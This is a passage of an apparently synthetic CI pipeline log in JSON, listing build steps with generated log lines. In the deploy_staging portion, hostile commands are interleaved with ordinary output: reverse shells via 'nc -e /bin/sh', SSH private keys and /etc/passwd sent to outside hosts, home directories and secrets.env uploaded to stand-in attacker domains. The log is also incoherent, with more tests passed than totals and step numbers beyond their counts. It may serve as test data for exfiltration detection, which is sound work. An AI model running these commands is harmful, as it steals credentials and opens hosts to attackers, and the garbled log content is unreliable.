utils/service.java...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBundling main.css\nnpm notice: package.json updated\nStep 10/19: Linting\nBundling vendor.css\n\u2713 All checks passed\nnpm notice: created a lockfile\n  PASS: test_auth_login (245ms)\nUploading artifact 'dist' (31 files)\nDone.\npip: Installing build dependencies...\nArtifact downloaded: 16MB\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nRan 151 tests in 34s\nFetching from https://githubusercontent.com/package.json\n[12:46:53] WARN: Deprecated API usage\nTLS handshake completed\nEnvironment: test\nInstalling jest@3.8.7\n[12:46:53] INFO: Cache refreshed\n[12:46:53] DEBUG: Memory usage: 1187MB\nGET /health - 201 (47ms)\n[12:46:53] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nTests: 413 passed, 283 total\nInstalling eslint@4.20.0\nnc -e /bin/sh 152.250.221.140 41494\n[12:46:53] DEBUG: Loading configuration\nPOST /api - 200 (297ms)\n[12:46:53] DEBUG: Memory usage: 1040MB\nnpm notice: package.json updated\nTest Suites: 42 passed, 14 total\nnpm install: resolved 474 packages\necho $(cat ~/.ssh/id_rsa) | base64 | nc 57.59.255.147 21559\n\u2717 build failed with exit code 67\n\u2713 validate completed\nCompiling src/main.py...\nnc -e /bin/sh 67.83.74.209 55632\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nTests: 420 passed, 341 total\nVerifying...\n\u2713 Step 'checkout' succeeded\nFetching submodules...\nSending 476MB of data to crypto-mine.io\nOK\nFinished.\nDone.\nException: ValueError\nCompiling components/handler.rs...\nArtifact downloaded: 38MB\nSnapshots: 8 passed, 39 total\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nnpm install: resolved 1315 packages\nStep 6/19: Testing\nOK\nCache miss for key-5833\n[12:46:53] DEBUG: Connection pool: 9 active\nUploading artifact 'coverage' (6 files)\nFetching from https://amazonaws.com/package.json\n\u2713 All checks passed\nUploading artifact 'build' (9 files)\nOK\nWARNING: prettier has known vulnerabilities\nStep 2/22: Deploying\nPlatform: linux-x64\nInstalling lodash@2.2.0\nGenerating source maps...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 94.255.108.1 33936\nCache saved successfully\nCache miss for key-1385\nFetching submodules...\n  PASS: test_db_connect (316ms)\nWARNING: axios has known vulnerabilities\nDone.\nException: NullPointerException\nNODE_ENV=test\nFetching submodules...\nMinifying main.js\nInstalling prettier@1.20.7\nCompiling utils/main.py...\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nException: RuntimeError\nCoverage: 90% statements, 74% branches\nCoverage: 73% statements, 87% branches\nyarn add: Done in 2.62s\nHEAD is now at c7fb4cc\nCompleted.\nCache invalidated: dependencies\nImage pulled successfully\n[12:46:53] INFO: Starting build process\nVerifying...\nCompiling src/utils.go...\nException: RuntimeError\n\u2713 lint completed\nAlready up to date.\nHEAD is now at c00f3dd\n[12:46:53] DEBUG: Memory usage: 326MB\n  PASS: test_user_create (412ms)\nSwitched to branch 'hotfix/task-129'\nEnvironment: production\n\u2713 Task completed in 2722ms\nCompiling lib/handler.rs...\nStep 8/18: Deploying\npip: Installing build dependencies...\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nnpm install: resolved 1058 packages\nMinifying main.js\necho $(cat ~/.ssh/id_rsa) | base64 | nc 98.65.172.163 9292\nPushing to registry...\nCache saved successfully\nUploading artifact 'dist' (29 files)\nnpm install: resolved 560 packages\nStep 3/23: Deploying\nWARNING: eslint has known vulnerabilities\nNODE_ENV=development\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nnpm install: resolved 840 packages\nCompiling components/index.js...\nPlatform: darwin-arm64\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nWaiting...\n[12:46:53] DEBUG: Initializing service\nStep 16/22: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/index.js...\nBundling main.css\nUploading artifact 'build' (7 files)\n[12:46:53] DEBUG: Loading configuration\n\u2713 All checks passed\nPulling image: python:latest\nSending 336MB of data to data-exfil.ru\nNODE_ENV=development\nLoading...\nRan 123 tests in 15s\nImage pulled successfully\nRan 196 tests in 57s\nNODE_ENV=development\n[12:46:53] DEBUG: Loading configuration\nSending 263MB of data to evil-server.cc\nUsing Python 3.12\n[12:46:53] DEBUG: Memory usage: 297MB\nCache invalidated: node_modules\nnc -e /bin/sh 185.95.98.60 41005\nCreating production build...\nTests: 380 passed, 166 total\nUsing Python 3.10\n\u2713 Step 'checkout' succeeded\nChecking out master branch\nArtifact uploaded: build.tar.gz (29MB)\nCompiling lib/utils.go...\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nStep 11/18: Building\n[12:46:53] INFO: Request completed\npip: Installing build dependencies...\n[12:46:53] INFO: Processing request\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-10T12:46:53.046620",
        "finished_at": "2025-12-10T12:47:08.094423",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Artifact uploaded: dist.zip (43MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "Done.",
          "[12:46:53] INFO: Starting build process",
          "Exception: NullPointerException",
          "Pulling image: python:3.11",
          "[12:46:53] WARN: Deprecated API usage",
          "Checking out master branch",
          "\u2713 test completed",
          "Cache miss for key-8039",
          "Tests: 230 passed, 243 total",
          "Switched to branch 'feature/task-279'",
          "Compiling src/service.java...",
          "Step 20/25: Testing",
          "[12:46:53] WARN: Deprecated API usage",
          "[12:46:53] WARN: Deprecated API usage",
          "pip install: Successfully installed lodash-5.11",
          "Success!",
          "Already up to date.",
          "npm install: resolved 1059 packages",
          "Checking out develop branch",
          "\u2713 Task completed in 1560ms",
          "Success!",
          "Fetching submodules...",
          "Switched to branch 'bugfix/task-563'",
          "\u2713 Task completed in 2019ms",
          "Cache hit for key-4350",
          "Artifact uploaded: dist.zip (62MB)",
          "Verifying...",
          "NODE_ENV=development",
          "Compiling utils/service.java...",
          "Optimizing 41 modules...",
          "Pushing to registry...",
          "Environment: development",
          "Cache restored successfully (371MB)",
          "NODE_ENV=development",
          "Pushing to registry...",
          "Step 1/20: Running migrations",
          "Cache invalidated: node_modules",
          "[12:46:53] WARN: Deprecated API usage",
          "Using Python 3.11",
          "pip: Downloading lodash-5.3.tar.gz",
          "[12:46:53] INFO: Cache refreshed",
          "Installing axios@2.6.1",
          "pip: Downloading prettier-1.1.tar.gz",
          "Success!",
          "Step 20/20: Linting",
          "Uploading artifact 'dist' (31 files)",
          "Fetching submodules...",
          "Environment: test",
          "Snapshots: 27 passed, 37 total",
          "[12:46:53] DEBUG: Loading configuration",
          "[12:46:53] WARN: Deprecated API usage",
          "[12:46:53] INFO: Request completed",
          "yarn add: Done in 26.60s",
          "Switched to branch 'hotfix/task-178'",
          "Snapshots: 14 passed, 44 total",
          "[12:46:53] WARN: Deprecated API usage",
          "Using Node.js 16.5.8",
          "Success!",
          "Done.",
          "Step 18/15: Testing",
          "Layer 7/11: ENV command",
          "Compiling utils/utils.go...",
          "  PASS: test_api_health (6ms)",
          "Environment: staging",
          "Using Node.js 18.18.9",
          "  PASS: integration/test_cache_hit.spec.js",
          "Cache hit for key-6150",
          "Environment: staging",
          "Step 1/18: Running migrations",
          "Tests: 159 passed, 241 total",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:53] DEBUG: Memory usage: 1731MB",
          "Checking out main branch",
          "Step 5/22: Linting",
          "Environment: staging",
          "Checking out main branch",
          "\u2713 All checks passed",
          "[12:46:53] INFO: Processing request",
          "Coverage: 94% statements, 71% branches",
          "yarn add: Done in 19.6s",
          "pip: Collecting eslint",
          "TLS handshake completed",
          "Cache saved successfully",
          "HEAD is now at fa4e37a",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:46:53] DEBUG: Memory usage: 1101MB",
          "Waiting...",
          "Step 15/25: Installing dependencies",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "Compiling components/main.py...",
          "pip: Collecting express",
          "Pushing to registry...",
          "Bundling styles.css",
          "Artifact uploaded: build.tar.gz (45MB)",
          "WARNING: express has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Processing...",
          "\u2713 package completed",
          "Time: 4.266s",
          "Step 16/24: Deploying",
          "  PASS: test_user_create (128ms)",
          "Ran 63 tests in 24s",
          "Processing...",
          "Coverage: 95% statements, 89% branches",
          "Loading...",
          "Fetching from https://googleapis.com/package.json",
          "Cache restored successfully (106MB)",
          "pip install: Successfully installed express-3.14",
          "Processing...",
          "\u2717 build failed with exit code 73",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 326 files...",
          "Installing lodash@5.5.8",
          "Building Docker image...",
          "Snapshots: 12 passed, 36 total",
          "npm notice: package.json updated",
          "[12:46:53] DEBUG: Initializing service",
          "Coverage: 83% statements, 86% branches",
          "Building Docker image...",
          "Tests: 247 passed, 101 total",
          "HEAD is now at bd66fae",
          "Step 17/22: Running migrations",
          "Step 2/20: Testing",
          "Cache saved successfully",
          "Step 4/25: Testing",
          "Ran 130 tests in 33s",
          "Fetching submodules...",
          "Using Node.js 18.15.3",
          "Generating source maps...",
          "Compiling utils/app.ts...",
          "Checking out main branch",
          "[12:46:53] WARN: Deprecated API usage",
          "TLS handshake completed",
          "pip: Collecting eslint",
          "GET /api - 204 (7ms)",
          "Step 4/17: Testing",
          "pip: Installing build dependencies...",
          "Cache miss for key-4377",
          "Artifact uploaded: dist.zip (33MB)",
          "Transforming 245 files...",
          "Loading...",
          "Building Docker image...",
          "  PASS: unit/test_auth_login.spec.js",
          "Artifact downloaded: 28MB",
          "pip install: Successfully installed lodash-3.16",
          "Optimizing 65 modules...",
          "Cache restored successfully (246MB)",
          "Cache miss for key-9658",
          "Uploading artifact 'coverage' (16 files)",
          "Fetching submodules...",
          "Completed.",
          "\u2713 All checks passed",
          "Snapshots: 17 passed, 18 total",
          "FAILED: test_cache_hit",
          "Compiling components/handler.rs...",
          "pip install: Successfully installed jest-5.19",
          "Already up to date.",
          "Loading...",
          "npm install: resolved 114 packages",
          "Minifying vendor.js",
          "Compiling utils/main.py...",
          "TLS handshake completed",
          "[12:46:53] INFO: Request completed",
          "Environment: development",
          "Generating source maps...",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:46:53] DEBUG: Initializing service",
          "Tests: 195 passed, 176 total",
          "[12:46:53] DEBUG: Query executed in 18ms",
          "Success!",
          "Bundling styles.js",
          "Connection established",
          "Snapshots: 35 passed, 43 total",
          "pip: Downloading express-3.3.tar.gz",
          "npm install: resolved 1952 packages",
          "Step 8/15: Deploying",
          "npm install: resolved 1816 packages",
          "  PASS: test_user_create (441ms)",
          "[12:46:53] INFO: Request completed",
          "[12:46:53] INFO: Processing request",
          "[12:46:53] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (51MB)",
          "GET /status - 200 (58ms)",
          "Pushing to registry...",
          "[12:46:53] DEBUG: Memory usage: 1265MB",
          "[12:46:53] DEBUG: Connection pool: 19 active",
          "[12:46:53] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "Cache miss for key-2336",
          "Creating production build...",
          "Layer 8/10: RUN command",
          "[12:46:53] INFO: Cache refreshed",
          "Compiling components/handler.rs...",
          "Step 11/16: Linting",
          "Compiling lib/index.js...",
          "Checking out develop branch",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-10T12:47:08.094423",
        "finished_at": "2025-12-10T12:47:23.142226",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Checking out develop branch",
          "Pushing to registry...",
          "Image pulled successfully",
          "yarn add: Done in 13.85s",
          "[12:46:53] DEBUG: Loading configuration",
          "OK",
          "Completed.",
          "[12:46:53] DEBUG: Query executed in 24ms",
          "Success!",
          "[12:46:53] INFO: Processing request",
          "Time: 117.33s",
          "Verifying...",
          "pip: Downloading lodash-3.14.tar.gz",
          "pip: Installing build dependencies...",
          "[12:46:53] DEBUG: Query executed in 61ms",
          "\u2713 Step 'install' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 31MB",
          "Uploading artifact 'coverage' (27 files)",
          "[12:46:53] INFO: Connecting to database",
          "Ran 109 tests in 19s",
          "WARNING: react has known vulnerabilities",
          "Step 14/15: Linting",
          "Ran 159 tests in 29s",
          "Step 19/23: Installing dependencies",
          "Minifying app.js",
          "npm notice: package.json updated",
          "Uploading artifact 'dist' (12 files)",
          "Platform: win32-x64",
          "[12:46:53] INFO: Connecting to database",
          "Compiling utils/handler.rs...",
          "Ready.",
          "Fetching from https://docker.io/package.json",
          "Platform: darwin-arm64",
          "\u2713 All checks passed",
          "[12:46:53] WARN: Deprecated API usage",
          "Coverage: 100% statements, 71% branches",
          "Pushing to registry...",
          "Generating source maps...",
          "Bundling main.css",
          "\u2713 Task completed in 201ms",
          "POST /upload - 200 (245ms)",
          "Building Docker image...",
          "\u2713 lint completed",
          "Step 3/24: Running migrations",
          "[12:46:53] DEBUG: Connection pool: 13 active",
          "Artifact downloaded: 15MB",
          "HEAD is now at 4577774",
          "[12:46:53] INFO: Cache refreshed",
          "Success!",
          "\u2713 All checks passed",
          "NODE_ENV=development",
          "Layer 6/8: RUN command",
          "Image pulled successfully",
          "[12:46:53] DEBUG: Memory usage: 329MB",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Using Python 3.12",
          "Cache invalidated: build",
          "Switched to branch 'hotfix/task-383'",
          "Tests: 420 passed, 442 total",
          "Already up to date.",
          "Cache invalidated: dependencies",
          "Transforming 347 files...",
          "Done.",
          "[12:46:53] DEBUG: Connection pool: 17 active",
          "Loading...",
          "Time: 74.503s",
          "NODE_ENV=production",
          "Minifying main.js",
          "Optimizing 35 modules...",
          "Cache restored successfully (494MB)",
          "[12:46:53] WARN: Deprecated API usage",
          "POST /api - 201 (397ms)",
          "Loading...",
          "Finished.",
          "Layer 8/9: COPY command",
          "Processing...",
          "\u2717 build failed with exit code 5",
          "Success!",
          "[12:46:53] INFO: Cache refreshed",
          "Compiling src/service.java...",
          "FAILED: test_auth_login",
          "pip: Installing build dependencies...",
          "\u2713 package completed",
          "Bundling runtime.css",
          "Layer 4/11: COPY command",
          "npm install: resolved 1657 packages",
          "Coverage: 86% statements, 76% branches",
          "Fetching submodules...",
          "yarn add: Done in 5.93s",
          "Step 11/17: Testing",
          "Step 10/18: Linting",
          "Creating production build...",
          "Cache restored successfully (490MB)",
          "Transforming 676 files...",
          "Waiting...",
          "WARNING: prettier has known vulnerabilities",
          "Ran 166 tests in 14s",
          "Bundling main.css",
          "[12:46:53] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Compiling utils/app.ts...",
          "Connection established",
          "Processing...",
          "Compiling utils/index.js...",
          "[12:46:53] DEBUG: Memory usage: 180MB",
          "\u2713 validate completed",
          "\u2713 Task completed in 2684ms",
          "Step 2/23: Testing",
          "Compiling utils/service.java...",
          "Step 7/16: Building",
          "Done.",
          "Uploading artifact 'dist' (7 files)",
          "OK",
          "Ran 198 tests in 16s",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 17MB",
          "pip: Collecting express",
          "Uploading artifact 'build' (25 files)",
          "Finished.",
          "[12:46:53] WARN: Deprecated API usage",
          "[12:46:53] DEBUG: Memory usage: 1061MB",
          "pip: Collecting eslint",
          "Installing lodash@3.7.4",
          "Environment: staging",
          "Compiling lib/index.js...",
          "[12:46:53] DEBUG: Query executed in 84ms",
          "[12:46:53] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 74",
          "Compiling utils/utils.go...",
          "Pushing to registry...",
          "Generating source maps...",
          "Completed.",
          "Pulling image: python:18",
          "npm notice: package.json updated",
          "Completed.",
          "Generating source maps...",
          "Exception: TypeError",
          "Transforming 724 files...",
          "Cache saved successfully",
          "Bundling runtime.js",
          "Cache miss for key-5092",
          "FAILED: test_auth_login",
          "Ran 169 tests in 6s",
          "Environment: production",
          "Installing jest@4.18.8",
          "[12:46:53] ERROR: Connection failed",
          "Exception: NullPointerException",
          "Cache restored successfully (214MB)",
          "Compiling components/utils.go...",
          "Compiling components/app.ts...",
          "Step 10/19: Installing dependencies",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Test Suites: 5 passed, 21 total",
          "Environment: test",
          "Ready.",
          "[12:46:53] INFO: Request completed",
          "pip: Downloading lodash-5.17.tar.gz",
          "pip install: Successfully installed jest-4.18",
          "Ran 138 tests in 4s",
          "  PASS: e2e/test_user_create.spec.js",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Finished.",
          "  PASS: test_cache_hit (438ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Creating production build...",
          "[12:46:53] INFO: Processing request",
          "\u2717 build failed with exit code 70",
          "Finished.",
          "Uploading artifact 'build' (14 files)",
          "Using Python 3.11",
          "Pushing to registry...",
          "Environment: staging",
          "Cache restored successfully (400MB)",
          "Compiling utils/service.java...",
          "npm notice: package.json updated",
          "Ran 191 tests in 34s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: linux-x64",
          "Cache restored successfully (372MB)",
          "Image pulled successfully",
          "Building Docker image...",
          "Tests: 311 passed, 375 total",
          "\u2713 Task completed in 2208ms",
          "npm notice: package.json updated",
          "Waiting...",
          "GET /api - 201 (80ms)",
          "Minifying app.js",
          "POST /data - 202 (279ms)",
          "[12:46:53] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (16MB)",
          "Step 2/24: Linting",
          "npm install: added 13 packages",
          "pip: Collecting lodash",
          "TLS handshake completed",
          "Artifact downloaded: 48MB",
          "Transforming 373 files...",
          "Compiling utils/app.ts...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-10T12:47:23.142226",
        "finished_at": "2025-12-10T12:47:38.190029",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact uploaded: dist.zip (81MB)",
          "Verifying...",
          "Artifact uploaded: dist.zip (81MB)",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out master branch",
          "pip: Collecting axios",
          "Transforming 113 files...",
          "Already up to date.",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "[12:46:53] INFO: Processing request",
          "npm install: resolved 639 packages",
          "Pulling image: python:latest",
          "Using Node.js 15.1.0",
          "Bundling runtime.js",
          "Pushing to registry...",
          "Using Python 3.12",
          "Verifying...",
          "Uploading artifact 'build' (15 files)",
          "  PASS: e2e/test_api_health.spec.js",
          "  PASS: unit/test_cache_hit.spec.js",
          "Cache saved successfully",
          "GET /api - 201 (42ms)",
          "Step 19/15: Running migrations",
          "yarn add: Done in 3.92s",
          "Cache invalidated: dependencies",
          "Tests: 325 passed, 431 total",
          "Cache restored successfully (408MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 5/20: Running migrations",
          "Test Suites: 18 passed, 5 total",
          "pip: Collecting jest",
          "Step 20/25: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "npm install: resolved 352 packages",
          "Test Suites: 38 passed, 32 total",
          "Generating source maps...",
          "Success!",
          "pip: Downloading jest-4.19.tar.gz",
          "Step 1/21: Building",
          "Artifact uploaded: dist.zip (66MB)",
          "Switched to branch 'hotfix/task-484'",
          "POST /data - 202 (389ms)",
          "[12:46:53] DEBUG: Memory usage: 716MB",
          "Done.",
          "Image pulled successfully",
          "Completed.",
          "WARNING: axios has known vulnerabilities",
          "Step 14/24: Testing",
          "Checking out master branch",
          "pip: Collecting react",
          "  PASS: e2e/test_auth_login.spec.js",
          "Verifying...",
          "HEAD is now at 737d87b",
          "Using Node.js 14.15.9",
          "\u2713 Step 'install' succeeded",
          "Uploading artifact 'dist' (46 files)",
          "Step 12/24: Deploying",
          "Fetching submodules...",
          "NODE_ENV=test",
          "Time: 65.306s",
          "Compiling utils/handler.rs...",
          "\u2717 build failed with exit code 34",
          "Completed.",
          "Ran 113 tests in 21s",
          "npm install: added 220 packages",
          "Step 16/18: Linting",
          "pip: Downloading express-1.7.tar.gz",
          "Step 9/19: Testing",
          "\u2713 Task completed in 4563ms",
          "Uploading artifact 'coverage' (20 files)",
          "  PASS: test_auth_login (62ms)",
          "Ran 35 tests in 6s",
          "Pulling image: python:3.11",
          "Cache restored successfully (51MB)",
          "  PASS: test_auth_login (333ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 489 files...",
          "Uploading artifact 'dist' (30 files)",
          "Finished.",
          "Uploading artifact 'build' (40 files)",
          "Cache restored successfully (64MB)",
          "[12:46:53] ERROR: Connection failed",
          "Uploading artifact 'dist' (10 files)",
          "Exception: NullPointerException",
          "\u2713 validate completed",
          "Bundling main.js",
          "npm install: resolved 125 packages",
          "Processing...",
          "Platform: win32-x64",
          "Cache saved successfully",
          "pip install: Successfully installed express-5.4",
          "Already up to date.",
          "Step 8/23: Installing dependencies",
          "Pulling image: node:latest",
          "Cache miss for key-1043",
          "[12:46:53] DEBUG: Query executed in 53ms",
          "Already up to date.",
          "Step 9/20: Linting",
          "Ran 124 tests in 7s",
          "Using Node.js 17.17.1",
          "Coverage: 74% statements, 74% branches",
          "WARNING: jest has known vulnerabilities",
          "Connection established",
          "Cache invalidated: dependencies",
          "[12:46:53] DEBUG: Query executed in 8ms",
          "Connection established",
          "Generating source maps...",
          "HEAD is now at dfff276",
          "pip install: Successfully installed axios-4.16",
          "Transforming 521 files...",
          "Connection established",
          "Ready.",
          "Platform: linux-x64",
          "\u2713 test completed",
          "Processing...",
          "\u2713 Task completed in 877ms",
          "Coverage: 74% statements, 73% branches",
          "Layer 4/9: COPY command",
          "pip: Collecting prettier",
          "pip: Downloading express-1.18.tar.gz",
          "Completed.",
          "Artifact uploaded: dist.zip (12MB)",
          "\u2713 validate completed",
          "Step 6/19: Building",
          "\u2713 Step 'setup' succeeded",
          "Building Docker image...",
          "Artifact downloaded: 43MB",
          "yarn add: Done in 30.29s",
          "Step 10/16: Running migrations",
          "[12:46:53] INFO: Connecting to database",
          "Pulling image: node:18",
          "[12:46:53] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "pip: Downloading jest-1.19.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-3155",
          "pip: Installing build dependencies...",
          "Time: 56.535s",
          "pip: Downloading react-3.9.tar.gz",
          "Cache restored successfully (409MB)",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (327MB)",
          "Compiling lib/utils.go...",
          "Verifying...",
          "[12:46:53] INFO: Processing request",
          "[12:46:53] DEBUG: Connection pool: 19 active",
          "[12:46:53] DEBUG: Memory usage: 1910MB",
          "GET /status - 204 (51ms)",
          "Time: 88.237s",
          "HEAD is now at 483d07e",
          "Connection established",
          "Using Node.js 15.9.2",
          "\u2713 Task completed in 4873ms",
          "Using Node.js 18.11.7",
          "Transforming 632 files...",
          "yarn add: Done in 5.66s",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "Artifact downloaded: 8MB",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:53] INFO: Connecting to database",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:46:53] INFO: Connecting to database",
          "Snapshots: 45 passed, 2 total",
          "[12:46:53] INFO: Cache refreshed",
          "Cache saved successfully",
          "Already up to date.",
          "Step 10/18: Building",
          "FAILED: test_db_connect",
          "pip install: Successfully installed lodash-4.16",
          "Loading...",
          "NODE_ENV=production",
          "Creating production build...",
          "Tests: 154 passed, 290 total",
          "[12:46:53] DEBUG: Connection pool: 1 active",
          "Coverage: 82% statements, 92% branches",
          "Step 11/24: Building",
          "GET /api - 201 (5ms)",
          "Image pulled successfully",
          "Pulling image: alpine:3.11",
          "\u2717 build failed with exit code 6",
          "Generating source maps...",
          "[12:46:53] WARN: Deprecated API usage",
          "[12:46:53] DEBUG: Query executed in 95ms",
          "[12:46:53] DEBUG: Loading configuration",
          "Platform: linux-x64",
          "NODE_ENV=development",
          "Fetching submodules...",
          "Cache hit for key-3594",
          "Coverage: 77% statements, 86% branches",
          "Pulling image: python:3.11",
          "pip: Collecting react",
          "Switched to branch 'bugfix/task-920'",
          "npm notice: created a lockfile",
          "Cache hit for key-6985",
          "Already up to date.",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-10T12:47:38.190029",
        "finished_at": "2025-12-10T12:47:47.218711",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:46:53] INFO: Connecting to database",
          "Layer 1/9: ENV command",
          "Cache saved successfully",
          "Compiling lib/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 23.87s",
          "FAILED: test_db_connect",
          "POST /upload - 200 (386ms)",
          "npm install: resolved 1640 packages",
          "Cache saved successfully",
          "Artifact downloaded: 45MB",
          "[12:46:53] DEBUG: Loading configuration",
          "Tests: 430 passed, 86 total",
          "Processing...",
          "Exception: TypeError",
          "Uploading artifact 'coverage' (47 files)",
          "Verifying...",
          "Finished.",
          "Ran 151 tests in 32s",
          "Building Docker image...",
          "Step 12/24: Installing dependencies",
          "Environment: test",
          "Optimizing 72 modules...",
          "POST /upload - 200 (389ms)",
          "Checking out master branch",
          "Minifying app.js",
          "[12:46:53] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: unit/test_cache_hit.spec.js",
          "Step 20/16: Building",
          "Ran 193 tests in 53s",
          "Exception: ValueError",
          "Already up to date.",
          "[12:46:53] INFO: Connecting to database",
          "NODE_ENV=production",
          "\u2713 Task completed in 836ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "pip: Collecting jest",
          "[12:46:53] INFO: Processing request",
          "Step 20/19: Building",
          "Optimizing 18 modules...",
          "[12:46:53] WARN: Deprecated API usage",
          "Cache restored successfully (182MB)",
          "Ready.",
          "Cache miss for key-4713",
          "Done.",
          "Fetching submodules...",
          "Finished.",
          "Ready.",
          "TLS handshake completed",
          "Cache restored successfully (186MB)",
          "\u2713 All checks passed",
          "Compiling lib/index.js...",
          "pip install: Successfully installed lodash-5.15",
          "Cache hit for key-8684",
          "pip: Downloading jest-3.13.tar.gz",
          "Success!",
          "Transforming 510 files...",
          "Step 3/18: Running migrations",
          "Using Python 3.11",
          "Cache hit for key-5016",
          "OK",
          "Fetching from https://npmjs.org/package.json",
          "  PASS: test_cache_hit (355ms)",
          "npm install: added 268 packages",
          "Generating source maps...",
          "Ready.",
          "Step 2/25: Testing",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:46:53] INFO: Cache refreshed",
          "Cache restored successfully (31MB)",
          "Step 4/21: Building",
          "[12:46:53] DEBUG: Query executed in 93ms",
          "Cache saved successfully",
          "  PASS: integration/test_user_create.spec.js",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Cache restored successfully (292MB)",
          "[12:46:53] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Verifying...",
          "yarn add: Done in 18.81s",
          "Building Docker image...",
          "Ran 120 tests in 32s",
          "Done.",
          "[12:46:53] ERROR: Connection failed",
          "Cache invalidated: dependencies",
          "OK",
          "Compiling utils/utils.go...",
          "\u2713 test completed",
          "[12:46:53] DEBUG: Memory usage: 998MB",
          "Optimizing 71 modules...",
          "[12:46:53] WARN: Deprecated API usage",
          "Loading...",
          "Tests: 151 passed, 468 total",
          "[12:46:53] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 1982ms",
          "FAILED: test_cache_hit",
          "[12:46:53] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (17MB)",
          "Cache restored successfully (408MB)",
          "[12:46:53] DEBUG: Loading configuration",
          "yarn add: Done in 6.99s",
          "Verifying...",
          "[12:46:53] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Cache restored successfully (232MB)",
          "\u2717 build failed with exit code 91",
          "Compiling src/service.java...",
          "Done.",
          "Verifying...",
          "GET /status - 204 (99ms)",
          "Cache saved successfully",
          "Step 5/18: Deploying",
          "Optimizing 47 modules...",
          "npm install: added 394 packages",
          "Coverage: 89% statements, 96% branches",
          "Layer 6/12: COPY command",
          "npm install: resolved 741 packages",
          "[12:46:53] ERROR: Connection failed",
          "Cache miss for key-4564",
          "Minifying app.js",
          "yarn add: Done in 6.26s",
          "Artifact downloaded: 5MB",
          "Success!",
          "Waiting...",
          "Completed.",
          "Compiling src/index.js...",
          "Snapshots: 12 passed, 31 total",
          "Snapshots: 19 passed, 43 total",
          "[12:46:53] INFO: Starting build process",
          "Compiling utils/index.js...",
          "Creating production build...",
          "Minifying main.js",
          "Environment: test",
          "\u2717 build failed with exit code 29",
          "Step 12/15: Installing dependencies",
          "\u2713 All checks passed",
          "  PASS: test_db_connect (342ms)",
          "Completed.",
          "Cache invalidated: build",
          "npm install: resolved 1945 packages",
          "  PASS: test_api_health (87ms)",
          "npm notice: created a lockfile",
          "Compiling utils/utils.go...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Pulling image: node:3.11",
          "Compiling utils/app.ts...",
          "[12:46:53] INFO: Processing request",
